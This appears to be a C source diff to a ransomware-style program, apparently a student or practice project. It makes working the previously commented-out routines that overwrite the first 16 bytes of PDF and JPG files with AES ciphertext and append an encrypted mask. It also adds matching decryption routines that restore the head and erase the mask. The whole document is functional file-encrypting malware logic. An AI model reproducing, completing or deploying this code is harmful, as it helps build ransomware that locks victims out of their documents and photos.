@@ -251,27 +251,25 @@ void *encryption_pdfs(void *param) {
     printf("\n");  // debug
 
     // overwrite cipherText on the head of target file
-    // FILE *overwrite_fp = fopen(fileDir, "ab");
-    // rewind(overwrite_fp); // move file pointer to the head of target file
-    // fwrite(overwrite_fp, 1, 16, cipherText);  // write cipherText on target
-    // file
-    // fclose(overwrite_fp);
+    FILE *overwrite_fp = fopen(fileDir, "r+b");
+    fwrite(cipherText, 1, 16, overwrite_fp);  // write cipherText on target
+    fclose(overwrite_fp);
 
     // mask를 AES-128 알고리즘으로 암호화
     mask = aes_128_encryption(mask);
     printf("after encryption: %s\n", mask);  // debug
 
     // overwrite encrypted mask on the tail of target file
-    // overwrite_fp = fopen(fileDir, "ab");
-    // fwrite(overwrite_fp, 1, 16, mask);  // write encrypted mask on target
-    // file
-
-    // fclose(overwrite_fp);
+    overwrite_fp = fopen(fileDir, "ab");
+    fwrite(mask, 1, 16, overwrite_fp);  // write encrypted mask on target
+    fclose(overwrite_fp);
 
     free(mask);
     free(plainText);
     fclose(fp);
     free(fileDir);
+
+    processed_pdf_count++;
   }
 
   return NULL;
@@ -335,27 +333,26 @@ void *encryption_jpgs(void *param) {
     printf("\n");
 
     // overwrite cipherText on the head of target file
-    // FILE *overwrite_fp = fopen(fileDir, "ab");
-    // rewind(overwrite_fp); // move file pointer to the head of target file
-    // fwrite(overwrite_fp, 1, 16, cipherText);  // write cipherText on target
-    // file
-    // fclose(overwrite_fp);
+    FILE *overwrite_fp = fopen(fileDir, "r+b");
+    printf("%ld\n", ftell(overwrite_fp));
+    fwrite(cipherText, 1, 16, overwrite_fp);  // write cipherText on target
+    fclose(overwrite_fp);
 
     // mask를 AES-128 알고리즘으로 암호화
     mask = aes_128_encryption(mask);
     printf("after encryption: %s\n", mask);  // debug
 
     // overwrite encrypted mask on the tail of target file
-    // overwrite_fp = fopen(fileDir, "ab");
-    // fwrite(overwrite_fp, 1, 16, mask);  // write encrypted mask on target
-    // file
-
-    // fclose(overwrite_fp);
+    overwrite_fp = fopen(fileDir, "ab");
+    fwrite(mask, 1, 16, overwrite_fp);  // write encrypted mask on target
+    fclose(overwrite_fp);
 
     free(mask);
     free(plainText);
     fclose(fp);
     free(fileDir);
+
+    processed_jpg_count++;
   }
 
   return NULL;
@@ -408,11 +405,27 @@ void *decryption_pdfs(void *param) {
     }
     printf("\n");
 
+    // write plainText in the head of file
+    fclose(payload_fp);
+    payload_fp = fopen(fileDir, "r+b");
+    fwrite(plainText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);
+
+    // erase mask in the tail of file
+    fclose(mask_fp);
+    mask_fp = fopen(fileDir, "r+b");
+    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
+    char eraser[1] = {'\0'};
+    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
+      fwrite(eraser, 1, 1, mask_fp);  // overwrite null character in 16 times
+    }
+
     free(mask);
     free(cipherText);
     fclose(mask_fp);
     fclose(payload_fp);
     free(fileDir);
+
+    processed_pdf_count++;
   }
 
   return NULL;
@@ -465,11 +478,27 @@ void *decryption_jpgs(void *param) {
     }
     printf("\n");
 
+    // write plainText in the head of file
+    fclose(payload_fp);
+    payload_fp = fopen(fileDir, "r+b");
+    fwrite(plainText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);
+
+    // erase mask in the tail of file
+    fclose(mask_fp);
+    mask_fp = fopen(fileDir, "r+b");
+    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
+    char eraser[1] = {'\0'};
+    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
+      fwrite(eraser, 1, 1, mask_fp);  // overwrite null character in 16 times
+    }
+
     free(mask);
     free(cipherText);
     fclose(mask_fp);
     fclose(payload_fp);
     free(fileDir);
+
+    processed_jpg_count++;
   }
 
   return NULL;
